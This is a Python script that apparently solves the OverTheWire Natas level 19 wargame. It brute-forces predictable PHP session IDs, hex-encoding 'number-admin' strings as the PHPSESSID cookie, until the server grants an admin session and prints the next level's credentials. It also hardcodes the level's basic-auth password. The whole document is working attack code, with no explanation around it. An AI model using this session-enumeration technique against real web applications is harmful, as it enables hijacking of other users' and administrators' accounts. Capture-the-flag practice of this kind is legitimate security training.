import requests
from requests.auth import HTTPBasicAuth
import codecs

fact="You are an admin. The credentials for the next level are:"

for i in range (641):
    cookie={'PHPSESSID':(str(i)+'-admin').encode('hex')}
    url=requests.get('http://natas19.natas.labs.overthewire.org/index.php',auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'),cookies=cookie)
    if fact in (url.text):
        print ("Gotcha ;-)......."+str(i))
        print (url.text)
        print("D0n3 wi+h the work.........")
        break
    print (i)
